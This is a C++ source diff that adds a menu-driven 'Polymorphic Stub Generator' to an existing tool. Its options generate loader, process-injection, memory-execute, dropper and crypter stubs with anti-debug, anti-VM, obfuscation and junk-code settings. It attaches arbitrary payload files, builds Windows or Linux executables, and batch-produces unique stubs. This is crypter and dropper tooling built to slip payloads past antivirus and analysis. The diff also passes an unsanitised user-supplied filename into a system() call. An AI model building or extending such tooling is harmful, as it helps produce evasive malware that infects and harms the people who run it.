@@ -4,6 +4,10 @@
 #include <sstream>
 #include <iomanip>
 #include <map>
+#include <thread>
+#include <chrono>
+#include <fstream>
+#include "include/stub_generator.h"
 
 #ifndef _WIN32
 #include "utils/windows_stubs.h"
@@ -52,6 +56,7 @@ void displayMenu() {
         if (hooksAvailable) {
             std::cout << "4. Security and Protection Options\n";
         }
+        std::cout << "5. Polymorphic Stub Generator\n";
         std::cout << "0. Exit\n";
         std::cout << "Enter your choice: ";
         
@@ -80,6 +85,11 @@ void displayMenu() {
             int secChoice;
             std::cin >> secChoice;
             handleSecurityChoice(secChoice, hookManager);
+        } else if (choice == 5) {
+            displayStubGeneratorMenu();
+            int stubChoice;
+            std::cin >> stubChoice;
+            handleStubGeneratorChoice(stubChoice);
         } else {
             std::cout << "Invalid choice. Please try again.\n";
         }
@@ -622,4 +632,269 @@ std::vector<uint8_t> getHexSeed() {
     }
     
     return seed;
+}
+
+void displayStubGeneratorMenu() {
+    std::cout << "\n==== Polymorphic Stub Generator ====\n";
+    std::cout << "1. Generate Basic Loader Stub\n";
+    std::cout << "2. Generate Process Injection Stub\n";
+    std::cout << "3. Generate Memory Execute Stub\n";
+    std::cout << "4. Generate Dropper Stub\n";
+    std::cout << "5. Generate Crypter Stub\n";
+    std::cout << "6. Generate Full Polymorphic Engine\n";
+    std::cout << "7. Attach File to Stub (Drag & Drop)\n";
+    std::cout << "8. Build Executable from Stub\n";
+    std::cout << "9. Batch Generate Unique Stubs\n";
+    std::cout << "0. Back to Main Menu\n";
+}
+
+void handleStubGeneratorChoice(int choice) {
+    static StubGenerator stubGen;
+    static DragDropHandler dragDrop;
+    static std::vector<uint8_t> currentStub;
+    
+    switch (choice) {
+        case 0:
+            return;
+            
+        case 1:
+        case 2:
+        case 3:
+        case 4:
+        case 5:
+        case 6: {
+            // Generate stub based on template
+            StubGenerator::StubTemplate templates[] = {
+                StubGenerator::StubTemplate::BASIC_LOADER,
+                StubGenerator::StubTemplate::PROCESS_INJECTION,
+                StubGenerator::StubTemplate::MEMORY_EXECUTE,
+                StubGenerator::StubTemplate::DROPPER,
+                StubGenerator::StubTemplate::CRYPTER,
+                StubGenerator::StubTemplate::POLYMORPHIC_ENGINE
+            };
+            
+            // Configure stub options
+            StubGenerator::StubConfig config;
+            
+            std::cout << "\n=== Stub Configuration ===\n";
+            std::cout << "Enable Anti-Debug? (y/n): ";
+            char yn;
+            std::cin >> yn;
+            config.antiDebug = (yn == 'y' || yn == 'Y');
+            
+            std::cout << "Enable Anti-VM? (y/n): ";
+            std::cin >> yn;
+            config.antiVM = (yn == 'y' || yn == 'Y');
+            
+            std::cout << "Enable Code Obfuscation? (y/n): ";
+            std::cin >> yn;
+            config.obfuscateCode = (yn == 'y' || yn == 'Y');
+            
+            std::cout << "Add Junk Code? (y/n): ";
+            std::cin >> yn;
+            config.addJunkCode = (yn == 'y' || yn == 'Y');
+            
+            std::cout << "Randomize Layout? (y/n): ";
+            std::cin >> yn;
+            config.randomizeLayout = (yn == 'y' || yn == 'Y');
+            
+            // Generate the stub
+            currentStub = stubGen.generateStub(templates[choice - 1], config);
+            
+            std::cout << "\n[+] Stub generated successfully!\n";
+            std::cout << "    Size: " << currentStub.size() << " bytes\n";
+            std::cout << "    Hash: " << stubGen.getStubHash() << "\n";
+            
+            // Save stub to file
+            std::cout << "\nSave stub to file? (y/n): ";
+            std::cin >> yn;
+            if (yn == 'y' || yn == 'Y') {
+                std::cout << "Enter output filename: ";
+                std::string filename;
+                std::cin >> filename;
+                
+                std::ofstream file(filename, std::ios::binary);
+                if (file) {
+                    file.write(reinterpret_cast<const char*>(currentStub.data()), currentStub.size());
+                    file.close();
+                    std::cout << "[+] Stub saved to: " << filename << "\n";
+                } else {
+                    std::cout << "[-] Failed to save stub\n";
+                }
+            }
+            break;
+        }
+            
+        case 7: {
+            // Drag & Drop file attachment
+            std::cout << "\n=== Drag & Drop File Attachment ===\n";
+            
+            if (currentStub.empty()) {
+                std::cout << "[-] No stub loaded. Generate a stub first.\n";
+                break;
+            }
+            
+            // Initialize drag-drop if not already done
+            if (!dragDrop.initialize()) {
+                // Fallback to manual input
+                std::cout << "Drag & Drop not available. Enter file path manually: ";
+                std::string filePath;
+                std::cin.ignore();
+                std::getline(std::cin, filePath);
+                
+                // Read the file
+                std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+                if (!file) {
+                    std::cout << "[-] Failed to open file: " << filePath << "\n";
+                    break;
+                }
+                
+                size_t fileSize = file.tellg();
+                file.seekg(0, std::ios::beg);
+                
+                std::vector<uint8_t> payload(fileSize);
+                file.read(reinterpret_cast<char*>(payload.data()), fileSize);
+                file.close();
+                
+                // Attach payload to stub
+                if (stubGen.attachPayload(currentStub, payload)) {
+                    std::cout << "[+] File attached successfully!\n";
+                    std::cout << "    Payload size: " << fileSize << " bytes\n";
+                    std::cout << "    Total size: " << currentStub.size() << " bytes\n";
+                } else {
+                    std::cout << "[-] Failed to attach payload\n";
+                }
+            } else {
+                std::cout << "Drag and drop your file here...\n";
+                std::cout << "(or press Enter to cancel)\n";
+                
+                // Simulate waiting for drag-drop
+                std::this_thread::sleep_for(std::chrono::seconds(2));
+                
+                if (dragDrop.hasDroppedFiles()) {
+                    auto files = dragDrop.getDroppedFiles();
+                    if (!files.empty()) {
+                        std::cout << "[+] File dropped: " << files[0] << "\n";
+                        // Process the dropped file
+                        // ... (similar to manual input above)
+                    }
+                    dragDrop.clearDroppedFiles();
+                }
+            }
+            break;
+        }
+            
+        case 8: {
+            // Build executable
+            std::cout << "\n=== Build Executable ===\n";
+            
+            if (currentStub.empty()) {
+                std::cout << "[-] No stub loaded. Generate a stub first.\n";
+                break;
+            }
+            
+            std::cout << "Enter output executable name: ";
+            std::string outputPath;
+            std::cin >> outputPath;
+            
+            // Add .exe extension if not present
+            if (outputPath.find(".exe") == std::string::npos && 
+                outputPath.find(".elf") == std::string::npos) {
+#ifdef _WIN32
+                outputPath += ".exe";
+#else
+                outputPath += ".elf";
+#endif
+            }
+            
+            ExecutableBuilder builder;
+            ExecutableBuilder::ExeType exeType;
+            
+            std::cout << "Select executable type:\n";
+            std::cout << "1. Windows PE32 (32-bit)\n";
+            std::cout << "2. Windows PE64 (64-bit)\n";
+            std::cout << "3. Linux ELF32 (32-bit)\n";
+            std::cout << "4. Linux ELF64 (64-bit)\n";
+            std::cout << "Choice: ";
+            
+            int typeChoice;
+            std::cin >> typeChoice;
+            
+            switch (typeChoice) {
+                case 1: exeType = ExecutableBuilder::ExeType::PE32; break;
+                case 2: exeType = ExecutableBuilder::ExeType::PE64; break;
+                case 3: exeType = ExecutableBuilder::ExeType::ELF32; break;
+                case 4: exeType = ExecutableBuilder::ExeType::ELF64; break;
+                default: exeType = ExecutableBuilder::ExeType::PE32; break;
+            }
+            
+            if (builder.buildExecutable(outputPath, currentStub, {}, exeType)) {
+                std::cout << "[+] Executable created successfully: " << outputPath << "\n";
+                
+                // Make executable on Linux
+#ifndef _WIN32
+                std::string cmd = "chmod +x " + outputPath;
+                system(cmd.c_str());
+#endif
+            } else {
+                std::cout << "[-] Failed to create executable\n";
+            }
+            break;
+        }
+            
+        case 9: {
+            // Batch generate unique stubs
+            std::cout << "\n=== Batch Generate Unique Stubs ===\n";
+            std::cout << "Number of stubs to generate: ";
+            int count;
+            std::cin >> count;
+            
+            if (count <= 0 || count > 100) {
+                std::cout << "[-] Invalid count (1-100)\n";
+                break;
+            }
+            
+            std::cout << "Base filename prefix: ";
+            std::string prefix;
+            std::cin >> prefix;
+            
+            // Use default config for batch generation
+            StubGenerator::StubConfig config;
+            config.antiDebug = true;
+            config.antiVM = true;
+            config.obfuscateCode = true;
+            config.addJunkCode = true;
+            config.randomizeLayout = true;
+            
+            std::cout << "\nGenerating " << count << " unique stubs...\n";
+            
+            for (int i = 0; i < count; i++) {
+                // Generate unique stub
+                auto stub = stubGen.generateStub(StubGenerator::StubTemplate::POLYMORPHIC_ENGINE, config);
+                
+                // Save to file
+                std::stringstream filename;
+                filename << prefix << "_" << std::setfill('0') << std::setw(3) << i << ".bin";
+                
+                std::ofstream file(filename.str(), std::ios::binary);
+                if (file) {
+                    file.write(reinterpret_cast<const char*>(stub.data()), stub.size());
+                    file.close();
+                    
+                    std::cout << "[" << i+1 << "/" << count << "] Generated: " 
+                              << filename.str() << " (Size: " << stub.size() << " bytes)\n";
+                }
+                
+                // Small delay to ensure different random seeds
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            }
+            
+            std::cout << "\n[+] Batch generation complete!\n";
+            break;
+        }
+            
+        default:
+            std::cout << "Invalid choice.\n";
+            break;
+    }
 }
